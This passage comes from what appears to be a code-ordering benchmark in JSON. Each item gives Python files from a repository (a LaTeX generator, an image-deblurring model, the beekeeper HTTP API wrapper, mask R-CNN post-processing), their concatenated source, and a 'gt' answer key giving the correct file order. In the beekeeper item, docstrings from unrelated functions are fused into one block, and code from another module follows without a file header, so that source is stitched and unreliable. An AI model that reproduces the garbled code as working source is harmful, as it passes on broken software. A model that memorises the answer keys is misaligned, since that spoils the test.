ALGORITHMIC = \"algorithmic\"\n    FUNCTION = \"function\"\n    IPYTHON_ALGORITHMIC = \"ipython-algorithmic\"\n\n\ndef get_latex(\n    fn: Callable[..., Any],\n    *,\n    style: Style = Style.FUNCTION,\n    config: cfg.Config | None = None,\n    **kwargs,\n) -> str:\n\n    merged_config = cfg.Config.defaults().merge(config=config, **kwargs)\n\n\n    tree = parser.parse_function(fn)\n\n\n    tree = transformers.AugAssignReplacer().visit(tree)\n\n\n    if merged_config.prefixes is not None:\n        tree = transformers.PrefixTrimmer(merged_config.prefixes).visit(tree)\n    if merged_config.identifiers is not None:\n        tree = transformers.IdentifierReplacer(merged_config.identifiers).visit(tree)\n    if merged_config.reduce_assignments:\n        tree = transformers.DocstringRemover().visit(tree)\n        tree = transformers.AssignmentReducer().visit(tree)\n    if merged_config.expand_functions is not None:\n        tree = transformers.FunctionExpander(merged_config.expand_functions).visit(tree)\n\n\n    if style == Style.ALGORITHMIC:\n        return codegen.AlgorithmicCodegen(\n            use_math_symbols=merged_config.use_math_symbols,\n            use_set_symbols=merged_config.use_set_symbols,\n        ).visit(tree)\n    elif style == Style.FUNCTION:\n        return codegen.FunctionCodegen(\n            use_math_symbols=merged_config.use_math_symbols,\n            use_signature=merged_config.use_signature,\n            use_set_symbols=merged_config.use_set_symbols,\n        ).visit(tree)\n    elif style == Style.IPYTHON_ALGORITHMIC:\n        return codegen.IPythonAlgorithmicCodegen(\n            use_math_symbols=merged_config.use_math_symbols,\n            use_set_symbols=merged_config.use_set_symbols,\n        ).visit(tree)\n\n    raise ValueError(f\"Unrecognized style: {style}\")\n",
        "gt": [
            "'latexify_py/src/latexify/codegen/algorithmic_codegen.py'",
            "'latexify_py/src/latexify/codegen/__init__.py'",
            "'latexify_py/src/latexify/generate_latex.py'",
            "'latexify_py/src/latexify/__init__.py'"
        ]
    },
    {
        "files": [
            "'blur-kernel-space-exploring/generic_deblur.py'",
            "'blur-kernel-space-exploring/models/deblurring/image_deblur.py'",
            "'blur-kernel-space-exploring/models/dips.py'",
            "'blur-kernel-space-exploring/models/backbones/skip/concat.py'",
            "'blur-kernel-space-exploring/models/deblurring/joint_deblur.py'",
            "'blur-kernel-space-exploring/models/backbones/skip/skip.py'"
        ],
        "content": "'blur-kernel-space-exploring/generic_deblur.py'\n:import argparse\n\nimport cv2\nimport yaml\nfrom models.deblurring.joint_deblur import JointDeblur\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Kernel extractor testing\")\n\n    parser.add_argument(\"--image_path\", action=\"store\", help=\"image path\", type=str, required=True)\n    parser.add_argument(\"--save_path\", action=\"store\", help=\"save path\", type=str, default=\"res.png\")\n    parser.add_argument(\"--yml_path\", action=\"store\", help=\"yml path\", type=str, required=True)\n\n    args = parser.parse_args()\n\n\n    with open(args.yml_path, \"rb\") as f:\n        opt = yaml.safe_load(f)\n    model = JointDeblur(opt)\n\n    blur_img = cv2.cvtColor(cv2.imread(args.image_path), cv2.COLOR_BGR2RGB)\n    sharp_img = model.deblur(blur_img)\n\n    cv2.imwrite(args.save_path, sharp_img)\n\n\nmain()\n\n'blur-kernel-space-exploring/models/deblurring/image_deblur.py'\n:import torch\nimport torch.nn as nn\nimport utils.util as util\nfrom models.dips import ImageDIP, KernelDIP\nfrom models.kernel_encoding.kernel_wizard import KernelWizard\nfrom models.losses.hyper_laplacian_penalty import HyperLaplacianPenalty\nfrom models.losses.perceptual_loss import PerceptualLoss\nfrom models.losses.ssim_loss import SSIM\nfrom torch.optim.lr_scheduler import StepLR\nfrom tqdm import tqdm\n\n\nclass ImageDeblur:\n    def __init__(self, opt):\n        self.opt = opt\n\n\n        self.ssim_loss = SSIM().cuda()\n        self.mse = nn.MSELoss().cuda()\n        self.perceptual_loss = PerceptualLoss().cuda()\n        self.laplace_penalty = HyperLaplacianPenalty(3, 0.66).cuda()\n\n        self.kernel_wizard = KernelWizard(opt[\"KernelWizard\"]).cuda()\n        self.kernel_wizard.load_state_dict(torch.load(opt[\"KernelWizard\"][\"pretrained\"]))\n\n        for k, v in self.kernel_wizard.named_parameters():\n            v.requires_grad = False\n\n    def reset_optimizers(self):\n        self.x_optimizer = torch.optim.Adam(self.x_dip.parameters(), lr=self.opt[\"x_lr\"])\n        self.k_optimizer = torch.optim.Adam(self.k_dip.parameters(), lr=self.opt[\"k_lr\"])\n\n        self.x_scheduler = StepLR(self.x_optimizer, step_size=self.opt[\"num_iters\"] // 5, gamma=0.7)\n\n        self.k_scheduler = StepLR(self.k_optimizer, step_size=self.opt[\"num_iters\"] // 5, gamma=0.7)\n\n    def prepare_DIPs(self):\n\n        self.x_dip = ImageDIP(self.opt[\"ImageDIP\"]).cuda()\n        self.k_dip = KernelDIP(self.opt[\"KernelDIP\"]).cuda()\n\n\n\n        self.dip_zk = util.get_noise(64, \"noise\", (64, 64)).cuda()\n        self.dip_zx = util.get_noise(8, \"noise\", self.opt[\"img_size\"]).cuda()\n\n    def warmup(self, warmup_x, warmup_k):\n\n        reg_noise_std = self.opt[\"reg_noise_std\"]\n\n        for step in tqdm(range(self.opt[\"num_warmup_iters\"])):\n            self.x_optimizer.zero_grad()\n            dip_zx_rand = self.dip_zx + reg_noise_std * torch.randn_like(self.dip_zx).cuda()\n            x = self.x_dip(dip_zx_rand)\n\n            loss = self.mse(x, warmup_x)\n            loss.backward()\n            self.x_optimizer.step()\n\n        print(\"Warming up k DIP\")\n        for step in tqdm(range(self.opt[\"num_warmup_iters\"])):\n            self.k_optimizer.zero_grad()\n            dip_zk_rand = self.dip_zk + reg_noise_std * torch.randn_like(self.dip_zk).cuda()\n            k = self.k_dip(dip_zk_rand)\n\n            loss = self.mse(k, warmup_k)\n            loss.backward()\n            self.k_optimizer.step()\n\n    def deblur(self, img):\n        pass\n\n'blur-kernel-space-exploring/models/dips.py'\n:import models.arch_util as arch_util\nimport torch.nn as nn\nfrom models.backbones.resnet import ResnetBlock\nfrom models.backbones.skip.skip import skip\n\n\nclass KernelDIP(nn.Module):\n\n\n    def __init__(self, opt):\n        super(KernelDIP, self).__init__()\n\n        norm_layer = arch_util.get_norm_layer(\"none\")\n        n_blocks = opt[\"n_blocks\"]\n        nf = opt[\"nf\"]\n        padding_type = opt[\"padding_type\"]\n        use_dropout = opt[\"use_dropout\"]\n        kernel_dim = opt[\"kernel_dim\"]\n\n        input_nc = 64\n        model = [\n            nn.ReflectionPad2d(3),\n            nn.Conv2d(input_nc, nf, kernel_size=7, padding=0, bias=True),\n            norm_layer(nf),\n            nn.ReLU(True),\n        ]\n\n        n_downsampling = 5\n        for i in range(n_downsampling):\n            mult = 2 ** i\n            input_nc = min(nf * mult, kernel_dim)\n            output_nc = min(nf * mult * 2, kernel_dim)\n            model += [\n                nn.Conv2d(input_nc, output_nc, kernel_size=3, stride=2, padding=1, bias=True),\n                norm_layer(nf * mult * 2),\n                nn.ReLU(True),\n            ]\n\n        for i in range(n_blocks):\n            model += [\n                ResnetBlock(\n                    kernel_dim,\n                    padding_type=padding_type,\n                    norm_layer=norm_layer,\n                    use_dropout=use_dropout,\n                    use_bias=True,\n                )\n            ]\n\n        self.model = nn.Sequential(*model)\n\n    def forward(self, noise):\n        return self.model(noise)\n\n\nclass ImageDIP(nn.Module):\n\n\n    def __init__(self, opt):\n        super(ImageDIP, self).__init__()\n\n        input_nc = opt[\"input_nc\"]\n        output_nc = opt[\"output_nc\"]\n\n        self.model = skip(\n            input_nc,\n            output_nc,\n            num_channels_down=[128, 128, 128, 128, 128],\n            num_channels_up=[128, 128, 128, 128, 128],\n            num_channels_skip=[16, 16, 16, 16, 16],\n            upsample_mode=\"bilinear\",\n            need_sigmoid=True,\n            need_bias=True,\n            pad=opt[\"padding_type\"],\n            act_fun=\"LeakyReLU\",\n        )\n\n    def forward(self, img):\n        return self.model(img)\n\n'blur-kernel-space-exploring/models/backbones/skip/concat.py'\n:import numpy as np\nimport torch\nimport torch.nn as nn\n\n\nclass Concat(nn.Module):\n    def __init__(self, dim, *args):\n        super(Concat, self).__init__()\n        self.dim = dim\n\n        for idx, module in enumerate(args):\n            self.add_module(str(idx), module)\n\n    def forward(self, input):\n        inputs = []\n        for module in self._modules.values():\n            inputs.append(module(input))\n\n        inputs_shapes2 = [x.shape[2] for x in inputs]\n        inputs_shapes3 = [x.shape[3] for x in inputs]\n\n        if np.all(np.array(inputs_shapes2) == min(inputs_shapes2)) and np.all(\n            np.array(inputs_shapes3) == min(inputs_shapes3)\n        ):\n            inputs_ = inputs\n        else:\n            target_shape2 = min(inputs_shapes2)\n            target_shape3 = min(inputs_shapes3)\n\n            inputs_ = []\n            for inp in inputs:\n                diff2 = (inp.size(2) - target_shape2) // 2\n                diff3 = (inp.size(3) - target_shape3) // 2\n                inputs_.append(inp[:, :, diff2 : diff2 + target_shape2, diff3 : diff3 + target_shape3])\n\n        return torch.cat(inputs_, dim=self.dim)\n\n    def __len__(self):\n        return len(self._modules)\n\n'blur-kernel-space-exploring/models/deblurring/joint_deblur.py'\n:import torch\nimport utils.util as util\nfrom models.deblurring.image_deblur import ImageDeblur\nfrom tqdm import tqdm\n\n\nclass JointDeblur(ImageDeblur):\n    def __init__(self, opt):\n        super(JointDeblur, self).__init__(opt)\n\n    def deblur(self, y):\n\n        y = util.img2tensor(y).unsqueeze(0).cuda()\n\n        self.prepare_DIPs()\n        self.reset_optimizers()\n\n        warmup_k = torch.load(self.opt[\"warmup_k_path\"]).cuda()\n        self.warmup(y, warmup_k)\n\n\n\n        print(\"Deblurring\")\n        reg_noise_std = self.opt[\"reg_noise_std\"]\n        for step in tqdm(range(self.opt[\"num_iters\"])):\n            dip_zx_rand = self.dip_zx + reg_noise_std * torch.randn_like(self.dip_zx).cuda()\n            dip_zk_rand = self.dip_zk + reg_noise_std * torch.randn_like(self.dip_zk).cuda()\n\n            self.x_optimizer.zero_grad()\n            self.k_optimizer.zero_grad()\n\n            self.x_scheduler.step()\n            self.k_scheduler.step()\n\n            x = self.x_dip(dip_zx_rand)\n            k = self.k_dip(dip_zk_rand)\n\n            fake_y = self.kernel_wizard.adaptKernel(x, k)\n\n            if step < self.opt[\"num_iters\"] // 2:\n                total_loss = 6e-1 * self.perceptual_loss(fake_y, y)\n                total_loss += 1 - self.ssim_loss(fake_y, y)\n                total_loss += 5e-5 * torch.norm(k)\n                total_loss += 2e-2 * self.laplace_penalty(x)\n            else:\n                total_loss = self.perceptual_loss(fake_y, y)\n                total_loss += 5e-2 * self.laplace_penalty(x)\n                total_loss += 5e-4 * torch.norm(k)\n\n            total_loss.backward()\n\n            self.x_optimizer.step()\n            self.k_optimizer.step()\n\n\n\n\n\n\n        return util.tensor2img(x.detach())\n\n'blur-kernel-space-exploring/models/backbones/skip/skip.py'\n:import torch\nimport torch.nn as nn\n\nfrom .concat import Concat\nfrom .non_local_dot_product import NONLocalBlock2D\nfrom .util import get_activation, get_conv\n\n\ndef add_module(self, module):\n    self.add_module(str(len(self) + 1), module)\n\n\ntorch.nn.Module.add = add_module\n\n\ndef skip(\n    num_input_channels=2,\n    num_output_channels=3,\n    num_channels_down=[16, 32, 64, 128, 128],\n    num_channels_up=[16, 32, 64, 128, 128],\n    num_channels_skip=[4, 4, 4, 4, 4],\n    filter_size_down=3,\n    filter_size_up=3,\n    filter_skip_size=1,\n    need_sigmoid=True,\n    need_bias=True,\n    pad=\"zero\",\n    upsample_mode=\"nearest\",\n    downsample_mode=\"stride\",\n    act_fun=\"LeakyReLU\",\n    need1x1_up=True,\n):\n\n    assert len(num_channels_down) == len(num_channels_up) == len(num_channels_skip)\n\n    n_scales = len(num_channels_down)\n\n    if not (isinstance(upsample_mode, list) or isinstance(upsample_mode, tuple)):\n        upsample_mode = [upsample_mode] * n_scales\n\n    if not (isinstance(downsample_mode, list) or isinstance(downsample_mode, tuple)):\n        downsample_mode = [downsample_mode] * n_scales\n\n    if not (isinstance(filter_size_down, list) or isinstance(filter_size_down, tuple)):\n        filter_size_down = [filter_size_down] * n_scales\n\n    if not (isinstance(filter_size_up, list) or isinstance(filter_size_up, tuple)):\n        filter_size_up = [filter_size_up] * n_scales\n\n    last_scale = n_scales - 1\n\n    model = nn.Sequential()\n    model_tmp = model\n\n    input_depth = num_input_channels\n    for i in range(len(num_channels_down)):\n\n        deeper = nn.Sequential()\n        skip = nn.Sequential()\n\n        if num_channels_skip[i] != 0:\n            model_tmp.add(Concat(1, skip, deeper))\n        else:\n            model_tmp.add(deeper)\n\n        model_tmp.add(\n            nn.BatchNorm2d(num_channels_skip[i] + (num_channels_up[i + 1] if i < last_scale else num_channels_down[i]))\n        )\n\n        if num_channels_skip[i] != 0:\n            skip.add(get_conv(input_depth, num_channels_skip[i], filter_skip_size, bias=need_bias, pad=pad))\n            skip.add(nn.BatchNorm2d(num_channels_skip[i]))\n            skip.add(get_activation(act_fun))\n\n\n\n        deeper.add(\n            get_conv(\n                input_depth,\n                num_channels_down[i],\n                filter_size_down[i],\n                2,\n                bias=need_bias,\n                pad=pad,\n                downsample_mode=downsample_mode[i],\n            )\n        )\n        deeper.add(nn.BatchNorm2d(num_channels_down[i]))\n        deeper.add(get_activation(act_fun))\n        if i > 1:\n            deeper.add(NONLocalBlock2D(in_channels=num_channels_down[i]))\n        deeper.add(get_conv(num_channels_down[i], num_channels_down[i], filter_size_down[i], bias=need_bias, pad=pad))\n        deeper.add(nn.BatchNorm2d(num_channels_down[i]))\n        deeper.add(get_activation(act_fun))\n\n        deeper_main = nn.Sequential()\n\n        if i == len(num_channels_down) - 1:\n\n            k = num_channels_down[i]\n        else:\n            deeper.add(deeper_main)\n            k = num_channels_up[i + 1]\n\n        deeper.add(nn.Upsample(scale_factor=2, mode=upsample_mode[i]))\n\n        model_tmp.add(\n            get_conv(num_channels_skip[i] + k, num_channels_up[i], filter_size_up[i], 1, bias=need_bias, pad=pad)\n        )\n        model_tmp.add(nn.BatchNorm2d(num_channels_up[i]))\n        model_tmp.add(get_activation(act_fun))\n\n        if need1x1_up:\n            model_tmp.add(get_conv(num_channels_up[i], num_channels_up[i], 1, bias=need_bias, pad=pad))\n            model_tmp.add(nn.BatchNorm2d(num_channels_up[i]))\n            model_tmp.add(get_activation(act_fun))\n\n        input_depth = num_channels_down[i]\n        model_tmp = deeper_main\n\n    model.add(get_conv(num_channels_up[0], num_output_channels, 1, bias=need_bias, pad=pad))\n    if need_sigmoid:\n        model.add(nn.Sigmoid())\n\n    return model\n",
        "gt": [
            "'blur-kernel-space-exploring/models/backbones/skip/concat.py'",
            "'blur-kernel-space-exploring/models/backbones/skip/skip.py'",
            "'blur-kernel-space-exploring/models/dips.py'",
            "'blur-kernel-space-exploring/models/deblurring/image_deblur.py'",
            "'blur-kernel-space-exploring/models/deblurring/joint_deblur.py'",
            "'blur-kernel-space-exploring/generic_deblur.py'"
        ]
    },
    {
        "files": [
            "'beekeeper/beekeeper/comms.py'",
            "'beekeeper/beekeeper/api.py'",
            "'beekeeper/beekeeper/__init__.py'",
            "'beekeeper/beekeeper/data_handlers.py'"
        ],
        "content": "'beekeeper/beekeeper/comms.py'\n:\n\nfrom __future__ import absolute_import, division\nfrom __future__ import unicode_literals, print_function\n\ntry:\n    from urllib2 import Request as Py2Request, HTTPError, URLError\n    from urllib2 import build_opener, HTTPCookieProcessor\n    from urllib import urlencode\n    import httplib\n    import cookielib\n    pyversion = 2\n\nexcept ImportError:\n    from urllib.request import Request as PythonRequest, build_opener\n    from urllib.request import HTTPCookieProcessor\n    from urllib.error import HTTPError, URLError\n    from urllib.parse import urlencode\n    import http.client as httplib\n    import http.cookiejar as cookielib\n    pyversion = 3\n\nimport socket\nimport functools\n\nfrom beekeeper.variable_handlers import render\nfrom beekeeper.data_handlers import decode\nfrom beekeeper.exceptions import TraversalError, TooMuchBodyData, RequestTimeout\n\nif pyversion == 2:\n    class PythonRequest(Py2Request):\n\n        def __init__(self, *args, **kwargs):\n            self._method = kwargs.pop('method', None)\n            Py2Request.__init__(self, *args, **kwargs)\n\n        def get_method(self):\n            return self._method if self._method else super(PythonRequest, self).get_method()\nelif pyversion == 3:\n    basestring = str\n\n\nCOOKIE_JAR = cookielib.CookieJar()\nREQUEST_OPENER = build_opener(HTTPCookieProcessor(COOKIE_JAR))\n\ndef download_as_json(url):\n\n    try:\n        return Response('application/json', request(url=url)).read()\n    except HTTPError as err:\n        raise ResponseException('application/json', err)\n\ndef request(*args, **kwargs):\n\n    timeout = kwargs.pop('timeout', 5)\n    req = PythonRequest(*args, **kwargs)\n    return REQUEST_OPENER.open(req, timeout=timeout)\n\nclass Request(object):\n\n\n\n    def __init__(self, action, variables):\n        self.action = action\n        self.url = self.action.endpoint.url()\n        self.replacements = {}\n        self.params = {}\n        self.output = {\n            'data': None,\n            'headers': {},\n            'method': self.action.method\n        }\n        for var_type in variables.types():\n            render(self, var_type, **variables.vals(var_type))\n\n    def send(self, **kwargs):\n\n        return_full_object = kwargs.get('return_full_object', False)\n        _verbose = kwargs.get('_verbose', False)\n        traversal = kwargs.get('traversal', None)\n        timeout = kwargs.get('_timeout', 5)\n        self.output['url'] = self.render_url()\n        with VerboseContextManager(verbose=_verbose):\n            try:\n                resp = Response(self.action.format(), request(timeout=timeout, **self.output), traversal)\n            except HTTPError as err:\n                raise ResponseException(self.action.format(), err)\n            except socket.timeout:\n                raise RequestTimeout(functools.partial(self.send, **kwargs))\n            except URLError as err:\n                if isinstance(err.reason, socket.timeout):\n                    raise RequestTimeout(functools.partial(self.send, **kwargs))\n                else:\n                    raise\n\n        if return_full_object:\n            return resp\n        else:\n            return resp.read()\n\n    def set_headers(self, **headers):\n        self.output['headers'].update(headers)\n\n    def set_data(self, data, override=False):\n        if self.output['data'] is None or override:\n            self.output['data'] = data\n        else:\n            raise TooMuchBodyData(self.output['data'], data)\n\n    def set_url_params(self, **params):\n        self.params.update(params)\n\n    def set_url_replacements(self, **replacements):\n        self.replacements.update(replacements)\n\n    def render_url(self):\n\n        url = self.url.format(**self.replacements)\n        if self.params:\n            return url + '?' + urlencode(self.params)\n        return url\n\nclass Response(object):\n\n\n\n    def __init__(self, static_format, response, traversal=None):\n        self.static_format = static_format\n        self.headers = response.headers\n        self.data = response.read()\n        self.code = response.getcode()\n        self.message = response.msg\n        self.traversal = traversal\n\n    def mimetype(self):\n        \"\"\"\n        Get the Content-Type header from the response. Strip\n        the \";charset=xxxxx\" portion if necessary. If we can't\n        find it, use the predefined format.\n\n        Look for a \"charset=\" variable in the Content-Type header;\n        if it's not there, just return a default value of UTF-8\n\n        Parse the body of the response using the Content-Type\n        header we pulled from the response, or the hive-defined\n        format, if such couldn't be pulled automatically.\n\n    Traverse the object we receive with the given path. Path\n    items can be either strings or lists of strings (or any\n    nested combination thereof). Behavior in given cases is\n    laid out line by line below.\n\n    The exception we raise when we get an HTTPError back from\n    the remote server. It's here and not in beekeeper.exceptions\n    because it inherits from Response, and we need to avoid\n    circular dependencies.\n\n    Sets httplib to verbose on __enter__; returns it to its\n    previous state on __exit__.\n\nThis module contains all the beekeeper classes that are used on the front end\nto directly interface between the developer and the remote API.\n\n    Contains the settings for an endpoint, as well as a backref to the API\n\n        Get API-level variables, and add in Endpoint-level variables.\n\n        Combine the API-level root URL with the Endpoint's path.\n\n        Create a new Action linked to this endpoint with the given args.\n\n        Get the Endpoint-level mimetype, deferring to the API level settings\n        if the Endpoint object doesn't have a value.\n\n    Holds Action objects in the appropriate namespace, and provides a __getitem__\n    dundermethod so that we can subscript by object ID when such exists\n\n        Allows us to subscript, dictionary-style, on the object if we\n        know what the object's unique key is.\n\n        Get a list of the available Actions on the APIObject.\n\n        Add a single Action to the APIObject.\n\n        Create a string describing the APIObject and its children\n        \"\"\"\n        out = ''\n        out += '|\\n'\n        if self._id_variable:\n            subs = '[{}]'.format(self._id_variable)\n        else:\n            subs = ''\n        out += '|---{}{}\\n'.format(name, subs)\n        if self._description:\n            out += '|   |   {}\\n'.format(self._description)\n        for name, action in self._actions.items():\n            out += action.printed_out(name)\n        return out\n\n    def id_variable(self):\n\n        return self._id_variable\n\nclass APIObjectInstance(object):\n\n\n    def __init__(self, api_object, id_key):\n        self._api_object = api_object\n        self._id_key = id_key\n        self._actions = api_object.defined_actions\n        self._id_variable = api_object.id_variable()\n\n    def __getattr__(self, name):\n\n        action = getattr(self._api_object, name)\n        return partial(action, **{self._id_variable: self._id_key})\n\nclass Action(object):\n\n\n\n    def __init__(self, endpoint, method, **kwargs):\n        self.endpoint = endpoint\n        self.method = method\n        self.vars = Variables(**kwargs.get('variables', {}))\n        self.mimetype = kwargs.get('mimetype', None)\n        self.url = endpoint.url\n        self.description = kwargs.get('description', None)\n        self.traversal = kwargs.get('traverse', None)\n        self.timeout = kwargs.get('timeout', 5)\n\n    def variables(self):\n\n        return self.endpoint.variables().add(**self.vars)\n\n    def execute(self, *args, **kwargs):\n\n        _verbose = kwargs.pop('_verbose', False)\n        return_full_object = kwargs.pop('return_full_object', False)\n        variables = self.variables().fill(*args, **kwargs)\n        return Request(self, variables).send(\n            traversal=self.traversal,\n            _verbose=_verbose,\n            return_full_object=return_full_object,\n            _timeout=self.timeout\n        )\n\n    def format(self):\n\n        if self.mimetype:\n            return self.mimetype\n        else:\n            return self.endpoint.format()\n\n    def printed_out(self, name):\n\n        opt = self.variables().optional_namestring()\n        req = self.variables().required_namestring()\n        out = ''\n        out += '|   |\\n'\n        out += '|   |---{}({}{})\\n'.format(name, req, opt)\n        if self.description:\n            out += '|   |       {}\\n'.format(self.description)\n        return out\n\nclass API(object):\n\n\n\n    def __init__(self, hive, *args, **kwargs):\n        self._root = hive.get('root')\n        self._mimetype = hive.get('mimetype', 'application/json')\n        self._vars = Variables(\n            variable_settings=hive.get('variable_settings', {}),\n            **hive.get('variables', {})\n            ).fill(*args, **kwargs)\n        self._endpoints = {}\n        self._description = hive.get('description', None)\n        self._name = hive.get('name', None)\n        self._objects = {}\n        for name, endpoint in hive['endpoints'].items():\n            self.add_endpoint(name, **endpoint)\n        for name, obj in hive['objects'].items():\n            self.add_object(name, obj)\n\n    @classmethod\n    def from_hive_file(cls, fname, *args, **kwargs):\n\n        version = kwargs.pop('version', None)\n        require = kwargs.pop('require_https', True)\n        return cls(Hive.from_file(fname, version, require), *args, **kwargs)\n\n    @classmethod\n    def from_remote_hive(cls, url, *args, **kwargs):\n\n        version = kwargs.pop('version', None)\n        require = kwargs.pop('require_https', False)\n        return cls(Hive.from_url(url, version, require), *args, **kwargs)\n\n    @classmethod\n    def from_domain(cls, domain, *args, **kwargs):\n\n        version = kwargs.pop('version', None)\n        require = kwargs.pop('require_https', False)\n        return cls(Hive.from_domain(domain, version, require), *args, **kwargs)\n\n    def __repr__(self):\n        out = ''\n        req_var = self.variables().required_namestring()\n        opt_var = self.variables().optional_namestring()\n        out += '{}({}{})\\n'.format(self._name, req_var, opt_var)\n        if self._description:\n            out += '|   {}\\n'.format(self._description)\n        for name, obj in self._objects.items():\n            out += obj.printed_out(name)\n        return out\n\n    def variables(self):\n\n        return copy.deepcopy(self._vars)\n\n    def add_endpoint(self, name, **kwargs):\n\n        self._endpoints[name] = Endpoint(self, **kwargs)\n\n    def add_object(self, name, obj):\n\n        if iskeyword(name):\n            name = '_' + name\n        setattr(self, name, APIObject(self, **obj))\n        self._objects[name] = getattr(self, name)\n\n    def new_action(self, endpoint, **kwargs):\n\n        return self._endpoints[endpoint].new_action(**kwargs)\n\n    def format(self):\n\n        return self._mimetype\n\n    def base_url(self):\n\n        return self._root\n\n'beekeeper/beekeeper/__init__.py'\n:\n\nfrom beekeeper.api import API\nfrom beekeeper.hive import Hive\nfrom beekeeper.data_handlers import DataHandler\nfrom beekeeper.variable_handlers import VariableHandler, set_content_type\nfrom beekeeper.variable_handlers import render as render_variables\n\n'beekeeper/beekeeper/data_handlers.py'\n:\"\"\"\nThis module provides methods to parse various data\ntypes into and out of binary form. Similar way of\ndoing things to variable_handlers; we map MIME types\nto format-specific classes in a dictionary, and then\nhave a generic \"run\" method that directs requests\npassed to it to the correct format-specific method.\n\"\"\"\n\nfrom __future__ import absolute_import, division\nfrom __future__ import unicode_literals, print_function\n\ntry:\n    from urllib import urlencode\nexcept ImportError:\n    from urllib.parse import urlencode\n\nimport json\nimport json.decoder\nfrom functools import partial\n\nimport xmltodict\n\nclass DataHandlerMeta(type):\n\n    def __init__(cls, name, bases, dct):\n        if not hasattr(cls, 'registry'):\n            cls.registry = {}\n        else:\n            cls.registry.update(**{mimetype: cls for mimetype in dct.get('mimetypes', [dct.get('mimetype')])})\n        super(DataHandlerMeta, cls).__init__(name, bases, dct)\n\nDataHandler = DataHandlerMeta(str('DataHandler'), (object,), {})\n\nclass XMLParser(DataHandler):\n    mimetypes = ['application/xml', 'text/xml']\n\n    @staticmethod\n    def dump(python_object, encoding):\n        if python_object:\n            return xmltodict.unparse(python_object).encode(encoding)\n\n    @staticmethod\n    def load(response, encoding):\n        return xmltodict.parse(response, encoding=encoding, xml_attribs=True, dict_constructor=dict)\n\nclass JSONParser(DataHandler):\n    mimetype = 'application/json'\n\n    @staticmethod\n    def dump(python_object, encoding):\n        if python_object:\n            return json.dumps(python_object).encode(encoding)\n\n    @staticmethod\n    def load(response, encoding):\n        return json.loads(response.decode(encoding))\n\nclass HTTPFormEncoder(DataHandler):\n    mimetype = 'application/x-www-form-urlencoded'\n\n    @staticmethod\n    def dump(python_object, encoding):\n        if python_object:\n            return urlencode(python_object).encode(encoding)\n\nclass PlainText(DataHandler):\n    mimetypes = ['text/plain', 'text/html']\n\n    @staticmethod\n    def dump(python_object, encoding):\n        if python_object:\n            return str(python_object).encode(encoding)\n\n    @staticmethod\n    def load(response, encoding):\n        response = response.decode(encoding)\n        try:\n            return json.loads(response)\n        except ValueError:\n            return response\n        except json.decoder.JSONDecodeError:\n            return response\n\nclass Binary(DataHandler):\n    mimetypes = ['application/octet-stream']\n\n    @staticmethod\n    def dump(python_object, encoding):\n        if python_object:\n            return python_object\n\n    @staticmethod\n    def load(response, encoding):\n        return response\n\ndef code(action, data, mimetype, encoding='utf-8'):\n    if action == 'dump' and hasattr(data, 'read'):\n        data = data.read()\n    if action == 'dump' and isinstance(data, bytes):\n        return getattr(Binary, action)(data, encoding)\n    if action == 'load' and not data:\n        return None\n    if action == 'load' and mimetype not in DataHandler.registry:\n        return getattr(Binary, action)(data, encoding)\n    if mimetype in DataHandler.registry and getattr(DataHandler.registry[mimetype], action, None):\n        return getattr(DataHandler.registry[mimetype], action)(data, encoding)\n    else:\n        raise Exception('Cannot parse MIME type {}'.format(mimetype))\n\nencode = partial(code, 'dump')\ndecode = partial(code, 'load')\n",
        "gt": [
            "'beekeeper/beekeeper/data_handlers.py'",
            "'beekeeper/beekeeper/comms.py'",
            "'beekeeper/beekeeper/api.py'",
            "'beekeeper/beekeeper/__init__.py'"
        ]
    },
    {
        "files": [
            "'MABN/det/maskrcnn_benchmark/modeling/roi_heads/mask_head/inference.py'",
            "'MABN/det/maskrcnn_benchmark/layers/misc.py'",
            "'MABN/det/maskrcnn_benchmark/modeling/roi_heads/mask_head/mask_head.py'"
        ],
        "content": "'MABN/det/maskrcnn_benchmark/modeling/roi_heads/mask_head/inference.py'\n:\nimport numpy as np\nimport torch\nfrom torch import nn\nfrom maskrcnn_benchmark.layers.misc import interpolate\n\nfrom maskrcnn_benchmark.structures.bounding_box import BoxList\n\n\n\n\nclass MaskPostProcessor(nn.Module):\n\n\n    def __init__(self, masker=None):\n        super(MaskPostProcessor, self).__init__()\n        self.masker = masker\n\n    def forward(self, x, boxes):\n\n        mask_prob = x.sigmoid()\n\n\n        num_masks = x.shape[0]\n        labels = [bbox.get_field(\"labels\") for bbox in boxes]\n        labels = torch.cat(labels)\n        index = torch.arange(num_masks, device=labels.device)\n        mask_prob = mask_prob[index, labels][:, None]\n\n        boxes_per_image = [len(box) for box in boxes]\n        mask_prob = mask_prob.split(boxes_per_image, dim=0)\n\n        if self.masker:\n            mask_prob = self.masker(mask_prob, boxes)\n\n        results = []\n        for prob, box in zip(mask_prob, boxes):\n            bbox = BoxList(box.bbox, box.size, mode=\"xyxy\")\n            for field in box.fields():\n                bbox.add_field(field, box.get_field(field))\n            bbox.add_field(\"mask\", prob)\n            results.append(bbox)\n\n        return results\n\n\nclass MaskPostProcessorCOCOFormat(MaskPostProcessor):\n\n\n    def forward(self, x, boxes):\n        import pycocotools.mask as mask_util\n        import numpy as np\n\n        results = super(MaskPostProcessorCOCOFormat, self).forward(x, boxes)\n        for result in results:\n            masks = result.get_field(\"mask\").cpu()\n            rles = [\n                mask_util.encode(np.array(mask[0, :, :, np.newaxis], order=\"F\"))[0]\n                for mask in masks\n            ]\n            for rle in rles:\n                rle[\"counts\"] = rle[\"counts\"].decode(\"utf-8\")\n            result.add_field(\"mask\", rles)\n        return results\n\n\n\n\n\ndef expand_boxes(boxes, scale):\n    w_half = (boxes[:, 2] - boxes[:, 0]) * .5\n    h_half = (boxes[:, 3] - boxes[:, 1]) * .5\n    x_c = (boxes[:, 2] + boxes[:, 0]) * .5\n    y_c = (boxes[:, 3] + boxes[:, 1]) * .5\n\n    w_half *= scale\n    h_half *= scale\n\n    boxes_exp = torch.zeros_like(boxes)\n    boxes_exp[:, 0] = x_c - w_half\n    boxes_exp[:, 2] = x_c + w_half\n    boxes_exp[:, 1] = y_c - h_half\n    boxes_exp[:, 3] = y_c + h_half\n    return boxes_exp\n\n\ndef expand_masks(mask, padding):\n    N = mask.shape[0]\n    M = mask.shape[-1]\n    pad2 = 2 * padding\n    scale = float(M + pad2) / M\n    padded_mask = mask.new_zeros((N, 1, M + pad2, M + pad2))\n\n    padded_mask[:, :, padding:-padding, padding:-padding] = mask\n    return padded_mask, scale\n\n\ndef paste_mask_in_image(mask, box, im_h, im_w, thresh=0.5, 